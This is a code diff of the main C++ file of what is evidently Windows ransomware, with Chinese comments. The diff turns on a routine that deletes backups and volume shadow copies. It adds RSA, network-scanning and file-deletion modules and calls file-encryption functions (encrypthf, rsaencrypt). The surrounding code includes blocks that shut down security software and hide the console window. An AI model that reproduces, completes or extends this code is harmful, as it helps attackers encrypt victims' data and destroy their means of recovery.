@@ -1,4 +1,7 @@
-﻿#include <windows.h>
+﻿#define WIN32_LEAN_AND_MEAN
+#define _WINSOCKAPI_
+#define NOMINMAX
+#include <windows.h>
 #include <lm.h>       // 用于 NetGetJoinInformation
 #include <vector>
 #include <thread>
@@ -13,8 +16,12 @@
 #include"Message.h"
 #include"tool.h"
 #include"beadmin.h"
-#include"cheat.h"
-#include"antihook.h"
+#include"rsa.h"
+#include"networkscan.h"
+#include"deletfile.h"
+//#include"cheat.h"
+//#include"networkscan.cpp"
+//#include"antihook.h"
 //#include"vbs.h"
 //#include"beadmin2.h"
 #pragma comment(lib, "netapi32.lib") // 链接 NetAPI32.lib
@@ -84,7 +91,7 @@ public:
         // 删除备份和卷影
         tasks.push_back(std::async(std::launch::async, [] {
           //  inject();
-            // deletV(); // 确保函数名正确
+             deletV(); // 确保函数名正确
             }));
 
         // 关闭安全软件
@@ -167,14 +174,15 @@ public:
 // ==================== 主程序 ====================
 int main() {
     // 隐藏控制台窗口
-    AntiHook_RemoveAllHooks();
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
+   // AntiHook_RemoveAllHooks();
+    //ShowWindow(GetConsoleWindow(), SW_HIDE);
     //  mainfunction();
       //vbs();
    // inject();
-    mainc();
-    int result = admin();
+    //mainc();
+   //int result = admin();
     encrypthf();
+    //network_scanner::StartScan(true);
     rsaencrypt();    // 启动定时任务
     //TimedFunctionRunner timer;
     // 根据权限级别执行核心功能
